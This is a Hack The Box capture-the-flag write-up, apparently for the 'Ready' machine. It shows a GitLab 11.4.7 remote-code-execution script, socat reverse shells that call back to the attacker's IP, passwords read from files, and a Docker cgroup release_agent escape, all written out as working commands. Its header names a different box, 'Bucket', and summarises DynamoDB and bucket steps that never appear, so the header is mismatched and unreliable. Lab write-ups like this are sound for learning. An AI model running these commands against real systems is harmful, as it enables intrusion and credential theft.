# Introduction

![Bucket](https://www.hackthebox.eu/storage/avatars/3f07dd46f3ff7d287d2f736b18c6ded7.png)

| Point | Description |
| :------:| :------: |
| Name | Bucket  |
| OS   | Linux  |
| Difficulty Rating| Medium   |
| Release | 12 Dec 2020   |
| IP | 10.10.10.220   |
| Owned | 17 Oct 2020 |

# Short retelling

* Find a subdomain
* Enamuration services
* Recon DynamoDB with AWS CLI
* Find buckets
* Upload a php reverse shell
* Get the user.txt
* Create the table with RCE in DynamoDB
* Get root's ia_rsa and root.txt

# Enumeration

## Nmap
Start to recon host Ready 10.10.10.220 with nmap

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-22 10:17 EST
Nmap scan report for 10.10.10.220
Host is up (0.17s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
5080/tcp open  http    nginx
|_http-favicon: Unknown favicon MD5: F7E3D97F404E71D302B3239EEF48D5F2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 53 disallowed entries (15 shown)
| / /autocomplete/users /search /api /admin /profile 
| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
|_/s/ /snippets/new /snippets/*/edit
| http-title: Sign in \xC2\xB7 GitLab
|_Requested resource was http://10.10.10.220:5080/users/sign_in
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Lets check site on 5080/tcp port.

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-01-24_181047.png)

GitLab is running on this host.

## Dirb

Lets check open directory of http://10.10.10.220:5080/.

```
┌──(root💀kali)-[/home/kali/HTB/Ready]
└─# dirb http://10.10.10.220:5080/                                                             

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Jan 24 06:13:16 2021
URL_BASE: http://10.10.10.220:5080/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.10.220:5080/ ----
+ http://10.10.10.220:5080/explore (CODE:200|SIZE:13343)                                                                                                                  
+ http://10.10.10.220:5080/favicon.ico (CODE:301|SIZE:174)                                                                                                                
+ http://10.10.10.220:5080/groups (CODE:302|SIZE:105)                                                                                                                     
+ http://10.10.10.220:5080/help (CODE:200|SIZE:37973)                                                                                                                     
+ http://10.10.10.220:5080/projects (CODE:302|SIZE:98)                                                                                                                    
+ http://10.10.10.220:5080/public (CODE:200|SIZE:13422)                                                                                                                   
+ http://10.10.10.220:5080/robots.txt (CODE:200|SIZE:2095)                                                                                                                
+ http://10.10.10.220:5080/root (CODE:200|SIZE:15795)                                                                                                                     
+ http://10.10.10.220:5080/Root (CODE:302|SIZE:95)                                                                                                                        
+ http://10.10.10.220:5080/search (CODE:200|SIZE:12693)                                                                                                                   
+ http://10.10.10.220:5080/snippets (CODE:302|SIZE:107)                                                                                                                   
+ http://10.10.10.220:5080/test (CODE:200|SIZE:15754)                                                                                                                     
                                                                                                                                                                          
-----------------
END_TIME: Sun Jan 24 06:27:15 2021
DOWNLOADED: 4612 - FOUND: 12                                                                            
```
We find some directories, checking everithing and nothithng interesting.

# Explotation#1

I think we need to find version of GitLab.

Lets try register with myself.
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-01-24_181832.png)

And logged in.
Now version of gitlab is available tu us in *http://10.10.10.220:5080/help*
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-01-24_182056.png)

Lets find some CVE for this version:
* https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/

Also find some exploits:
* https://www.exploit-db.com/exploits/49334
* https://www.exploit-db.com/exploits/49263
* https://github.com/dotPY-hax/gitlab_RCE *<-- we will use it*

With first and second scripts somethimg going wrong, but third python script runs very well.
So download it to our host and run.
```
┌──(root💀kali)-[/home/kali/HTB/Ready]
└─# python3 rce_gitlab.py http://10.10.10.220:5080/ 10.10.14.162
Gitlab Exploit by dotPY [insert fancy ascii art]
registering mQXh62U4sU:jCZjeF67za - 200
Getting version of http://10.10.10.220:5080/ - 200
The Version seems to be 11.4.7! Choose wisely
delete user mQXh62U4sU - 200
[0] - GitlabRCE1147 - RCE for Version <=11.4.7
[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
type a number and hit enter to choose exploit: 0
Start a listener on port 42069 and hit enter (nc -vlnp 42069)
registering ih5Ml80b7q:M6qTVJpRXu - 200
hacking in progress - 200
delete user ih5Ml80b7q - 200
```

And we get a reverse shell
```
┌──(root💀kali)-[/home/kali/HTB/Ready]
└─# nc -nlvp 42069                                                                                                                                                     1 ⨯
listening on [any] 42069 ...
connect to [10.10.14.162] from (UNKNOWN) [10.10.10.220] 34446
bash: cannot set terminal process group (502): Inappropriate ioctl for device
bash: no job control in this shell
git@gitlab:~/gitlab-rails/working$ 
```

Now I want to upgrade my reverse shell. There is a very good article about this [here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat). I wiil use socat.

1. We need to install socat on our victim host.

Download socat to our kali:
```
┌──(root💀kali)-[~]
└─# wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat    
```

Run simple hhtp web-server
```
┌──(root💀kali)-[~]
└─# python3 -m http.server 9191                                                                        
Serving HTTP on 0.0.0.0 port 9191 (http://0.0.0.0:9191/) ...
```

Download *socat* from our kali on victim machine
```
git@gitlab:/tmp# wget http://10.10.14.162:9191/socat -O socat              
wget http://10.10.14.162:9191/socat -O socat
--2021-01-24 09:06:28--  http://10.10.14.162:9191/socat
Connecting to 10.10.14.162:9191... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat               100%[===================>] 366.38K   301KB/s    in 1.2s    

2021-01-24 09:06:29 (301 KB/s) - 'socat' saved [375176/375176]
```

And make it executable
```
git@gitlab:/tmp# chmod +x socat
```

2. Run command
```
git@gitlab:/tmp# /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.162:5757
```

3. Dont't forget about listener on kali:
```
┌──(root💀kali)-[/home/kali/HTB/Ready]
└─# socat file:`tty`,raw,echo=0 tcp-listen:5757                 
git@gitlab:/tmp$ 
```

Done!

Now we can comfortably check directories...

And we find **user.txt**
```
┌──(root💀kali)-[/home/kali/HTB/Ready]
└─# socat file:`tty`,raw,echo=0 tcp-listen:5757                 
git@gitlab:/tmp$ cd /
git@gitlab:/$ ls
RELEASE  bin   cmd  etc   lib    media  opt     proc  root_pass  sbin  sys  usr                                                                                            
assets   boot  dev  home  lib64  mnt    output  root  run        srv   tmp  var                                                                                            
git@gitlab:/$ cd /home/dude/                                                                                                                                               
git@gitlab:/home/dude$ ls                                                                                                                                                  
user.txt                                                                                                                                                                   
git@gitlab:/home/dude$ cat user.txt                                                                                                                                        
e1e30b052b6ec0670698805d745e7682 
```

Also we find interesting pass *root_pass*
```
git@gitlab:/home/dude$ cd /                                                                                                                                                
git@gitlab:/$ cat root_pass                                                                                                                                                
YG65407Bjqvv9A0a8Tm_7w
```

Trying to login with root and fail. Also we failed sign in on GitLab with root.
But I remember, that I can change any password with gitlab-rails console.

```
git@gitlab:/$ cd ~
git@gitlab:~$ cd gitlab-rails/working/
git@gitlab:~/gitlab-rails/working$ gitlab-rails console
-------------------------------------------------------------------------------------
 GitLab:       11.4.7 (98f8423)
 GitLab Shell: 8.3.3
 postgresql:   9.6.8
-------------------------------------------------------------------------------------
Loading production environment (Rails 4.2.10)
irb(main):001:0> User.admins
User.admins
=> #<ActiveRecord::Relation [#<User id:1 @root>]>
irb(main):002:0> user = User.where(id: 1).first
user = User.where(id: 1).first
=> #<User id:1 @root>
irb(main):003:0> user.password = 'HelloWorld'
user.password = 'HelloWorld'
=> "HelloWorld"
irb(main):004:0> user.password_confirmation = 'HelloWorld'
user.password_confirmation = 'HelloWorld'
=> "HelloWorld"
irb(main):005:0> user.save!
user.save!
Enqueued ActionMailer::DeliveryJob (Job ID: ba8fffa3-5501-4668-846a-1b17a0e3ef5c) to Sidekiq(mailers) with arguments: "DeviseMailer", "password_change", "deliver_now", gid://gitlab/User/1
=> true
irb(main):006:0> exit
exit
```

And successfully login with **root:HelloWorld**
![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/%D0%B8%D0%B7%D0%BE%D0%B1%D1%80%D0%B0%D0%B6%D0%B5%D0%BD%D0%B8%D0%B5_2021-01-24_190549.png)

But nothing interesting...

# Explotation#2

Lets try to find way for Privilege Escalation with [LinPEAS Script](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS).

And send results of *LinPEAS Script* to kali with nc. If you dont know, then check [article](https://habr.com/ru/post/56049/).

Analyzing the file we find out, that it is docker container.
```
[+] Searching Signature verification failed in dmseg                                                                                                                       
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                        
 Not Found
                                                                                                                                                                           
[+] AppArmor enabled? .............. AppArmor Not Found                                                                                                                    
[+] grsecurity present? ............ grsecurity Not Found                                                                                                                  
[+] PaX bins present? .............. PaX Not Found                                                                                                                         
[+] Execshield enabled? ............ Execshield Not Found                                                                                                                  
[+] SELinux enabled? ............... sestatus Not Found
[+] Is ASLR enabled? ............... Yes                                                                                                                                   
[+] Printer? ....................... lpstat Not Found
[+] Is this a virtual machine? ..... Yes (docker)
[+] Is this a container? ........... Looks like we're in a Docker container                                                                                                
[+] Any running containers? ........ No
```

In the end, I find the **password**. Interesting...
```
Found /opt/backup/gitlab.rb
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
```

Try to login as **root** with password `wW59U!ZKMbG9+*#h` and... **success**
```
git@gitlab:/tmp$ su root
Password: 
root@gitlab:/tmp# 
```

Now I am root in the docker container...

Forum says that i need find the way to escape from docker!

I find this interesting [article with POC](https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1)

Lets follow this command to get **root.txt**
```
$ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
$ echo 1 > /tmp/cgrp/x/notify_on_release
$ host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
$ echo "$host_path/cmd" > /tmp/cgrp/release_agent
$ echo '#!/bin/sh' > /cmd
$ echo "cat /root/root.txt > $host_path/output" >> /cmd
$ chmod a+x /cmd
$ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

And we get **root.txt**
```
root@gitlab:/# ls
RELEASE  bin   cmd  etc   lib    media  opt     proc  root_pass  sbin  sys  usr
assets   boot  dev  home  lib64  mnt    output  root  run        srv   tmp  var
root@gitlab:/# cat output 
b7f98681505cd39066f67147b103c2b3
```

# Result and Resources

1. https://liveoverflow.com/gitlab-11-4-7-remote-code-execution-real-world-ctf-2018/
2. https://github.com/dotPY-hax/gitlab_RCE
3. https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
4. https://medium.com/better-programming/escaping-docker-privileged-containers-a7ae7d17f5a1
5. https://habr.com/ru/post/56049/
6. https://docs.gitlab.com/ee/administration/troubleshooting/gitlab_rails_cheat_sheet.html
